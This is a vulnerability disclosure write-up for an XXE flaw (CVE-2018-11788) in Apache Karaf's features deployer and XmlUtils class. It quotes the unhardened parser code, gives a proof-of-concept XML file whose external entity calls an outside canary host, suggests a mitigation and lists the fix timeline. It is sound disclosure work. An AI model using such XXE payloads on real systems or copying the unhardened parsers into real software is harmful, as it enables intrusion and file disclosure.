# Summary
Apache Karaf is a modern and polymorphic applications container. It's a lightweight, powered, and enterprise ready container powered by OSGi. Apache Karaf is a "product project", providing a complete and turnkey runtime. The runtime is "multi-facets", meaning that you can deploy different kind of applications: OSGi or non OSGi, webapplication, services based, etc.

In a recent research on Apache Karaf, I found some XXE (XML eXternal Entity injection) vulnerabilities existed on its XML parsers. It is caused that the parsers improperly parse XML document.

## Affected version
* Apache Karaf <= 4.2.1
* Apache Karaf <= 4.1.6

# Analysis

According to the [official manual](https://karaf.apache.org/manual/latest/#_deployer), Apache Karaf provides a features deployer by default, which allows users to "hot deploy" a features XML by dropping the file directly in the deploy folder.

When you drop a features XML in the deploy folder, the features deployer does:
* register the features XML as a features repository
* the features with install attribute set to "auto" will be automatically installed by the features deployer.

For instance, dropping the following XML in the deploy folder will automatically install feature1 and feature2, whereas feature3 won’t be installed:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">

    <feature name="feature1" version="1.0" install="auto">
        ...
    </feature>

    <feature name="feature2" version="1.0" install="auto">
        ...
    </feature>

    <feature name="feature3" version="1.0">
        ...
    </feature>

</features>
```
In order to learn how deployer handle the XML file, I checked the source codes of Karaf in [Github](https://github.com/apache/karaf) and found the invocations as follows:
* `Activator` class invokes [`doStart()`](https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/osgi/Activator.java#L38) function to start a listener for deployer
* `doStart()` function invokes [`FeatureDeploymentListener.init()`](https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L88) to initial a listener
* Then it calls function [`bundleChanged`](https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L180) - [`canHandle`](https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L145) - [`getRootElementName`](https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L258) to parse XML document by leveraging [`XMLInputFactory`](https://github.com/apache/karaf/blob/karaf-4.2.1/specs/java.xml/src/main/java/javax/xml/stream/XMLInputFactory.java)

But upon further investigation on function `getRootElementName` as below, there is no any prevention against XXE.
```Java
private QName getRootElementName(File artifact) throws Exception {
    if (xif == null) {
        xif = XMLInputFactory.newFactory();
        xif.setProperty(XMLInputFactory.IS_NAMESPACE_AWARE, true);
    }
    try (InputStream is = new FileInputStream(artifact)) {
        XMLStreamReader sr = xif.createXMLStreamReader(is);
        sr.nextTag();
        return sr.getName();
    }
}
```
Therefore, I assumed it posed a potential security risk for Apache Karaf.

## Proof of Concept
In order to verify my assumption, I tested on the latest official release of Apache Karaf 4.2.0 which was downloaded from <https://karaf.apache.org/download.html> as follows.

1. Download the binary distribution from [Apache Karaf 4.2.0](http://www.apache.org/dyn/closer.lua/karaf/4.2.0/apache-karaf-4.2.0.tar.gz)
2. Uncompress the package and locate to folder `bin` to start Karaf command console as shown below
```Shell
  bin$ ./karaf
          __ __                  ____      
         / //_/____ __________ _/ __/      
        / ,<  / __ `/ ___/ __ `/ /_        
       / /| |/ /_/ / /  / /_/ / __/        
      /_/ |_|\__,_/_/   \__,_/_/         

    Apache Karaf (4.2.0)

  Hit '<tab>' for a list of available commands
  and '[cmd] --help' for help on a specific command.
  Hit '<ctrl-d>' or type 'system:shutdown' or 'logout' to shutdown Karaf.

  karaf@root()>
```
3. Generate a DNS token on <https://canarytokens.org/generate> , e.g. `27av6zyg33g8q8xu338uvhnsc.canarytokens.com`
4. Craft a XML file and add an external entity with the generated DNS token embedded in DTDs as below:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```
5. Copy the crafted XML file under folder `deploy`
```Shell
apache-karaf-4.2.0$ cd deploy/
deploy$ tree
.
├── README
└── poc.xml
```
6. Wait for a while, and then you will see the DNS requests from your testing machine, which means the XML parser is trying to load external entities embedded in DTDs

   ![](http://avfisher.win/wp-content/uploads/2018/08/xxe_karaf-1024x524.png)

# Mitigation
Follow the OWASP guide below which provides concise information to prevent this vulnerability.
<https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java>

For instance, adding codes below to disable DTDs and external entities in function [`getRootElementName`](https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L258).
```Java
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); // This disables DTDs entirely for that factory
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false); // disable external entities
```

# Extra information
Apart from the finding mentioned above, I also found another class [`XmlUtils`](https://github.com/apache/karaf/blob/karaf-4.2.1/util/src/main/java/org/apache/karaf/util/XmlUtils.java) in Apache Karaf project didn't add any protection from XXE vulnerability when parsing XML document.
```Java
package org.apache.karaf.util;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.transform.Result;
import javax.xml.transform.Source;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerConfigurationException;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;

import org.w3c.dom.Document;
import org.xml.sax.ErrorHandler;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;

/**
 * Utils class to manipulate XML document in a thread safe way.
 */
public class XmlUtils {

    private static final ThreadLocal<DocumentBuilderFactory> DOCUMENT_BUILDER_FACTORY = new ThreadLocal<>();
    private static final ThreadLocal<TransformerFactory> TRANSFORMER_FACTORY = new ThreadLocal<>();
    private static final ThreadLocal<SAXParserFactory> SAX_PARSER_FACTORY = new ThreadLocal<>();

    public static Document parse(String uri) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        try {
            return db.parse(uri);
        } finally {
            db.reset();
        }
    }

    public static Document parse(InputStream stream) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        try {
            return db.parse(stream);
        } finally {
            db.reset();
        }
    }

    public static Document parse(File f) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        try {
            return db.parse(f);
        } finally {
            db.reset();
        }
    }

    public static Document parse(File f, ErrorHandler errorHandler) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        db.setErrorHandler(errorHandler);
        try {
            return db.parse(f);
        } finally {
            db.reset();
        }
    }

    public static void transform(Source xmlSource, Result outputTarget) throws TransformerException {
        Transformer t = transformer();
        try {
            t.transform(xmlSource, outputTarget);
        } finally {
            t.reset();
        }
    }

    public static void transform(Source xsltSource, Source xmlSource, Result outputTarget) throws TransformerException {
        Transformer t = transformer(xsltSource);
        try {
            t.transform(xmlSource, outputTarget);
        } finally {
            t.reset();
        }
    }

    public static XMLReader xmlReader() throws ParserConfigurationException, SAXException {
        SAXParserFactory spf = SAX_PARSER_FACTORY.get();
        if (spf == null) {
            spf = SAXParserFactory.newInstance();
            spf.setNamespaceAware(true);
            SAX_PARSER_FACTORY.set(spf);
        }
        return spf.newSAXParser().getXMLReader();
    }

    public static DocumentBuilder documentBuilder() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DOCUMENT_BUILDER_FACTORY.get();
        if (dbf == null) {
            dbf = DocumentBuilderFactory.newInstance();
            dbf.setNamespaceAware(true);
            DOCUMENT_BUILDER_FACTORY.set(dbf);
        }
        return dbf.newDocumentBuilder();
    }

    public static Transformer transformer() throws TransformerConfigurationException {
        TransformerFactory tf = TRANSFORMER_FACTORY.get();
        if (tf == null) {
            tf = TransformerFactory.newInstance();
            TRANSFORMER_FACTORY.set(tf);
        }
        return tf.newTransformer();
    }

    private static Transformer transformer(Source xsltSource) throws TransformerConfigurationException {
        TransformerFactory tf = TRANSFORMER_FACTORY.get();
        if (tf == null) {
            tf = TransformerFactory.newInstance();
            TRANSFORMER_FACTORY.set(tf);
        }
        return tf.newTransformer(xsltSource);
    }

}
```

# Timeline
* 2018-08-22: Reported this issue to Apache Security team.
* 2018-09-26: Apache Karaf team confirmed and fixed the issue in [KARAF-5911](https://issues.apache.org/jira/browse/KARAF-5911).
* 2018-11-30: Apache Karaf 4.1.7 was released with the fix.
* 2018-12-18: Apache Karaf 4.2.2 was released with the fix.
* 2019-01-06: Apache Karaf announced CVE-2018-11788 on this issue.

# Reference
* <https://karaf.apache.org/security/cve-2018-11788.txt>
* <https://issues.apache.org/jira/browse/KARAF-5911>
* <https://gitbox.apache.org/repos/asf?p=karaf.git;h=cc3332e>
* <https://gitbox.apache.org/repos/asf?p=karaf.git;h=1ffa6d1>
* <http://avfisher.win/archives/1052>
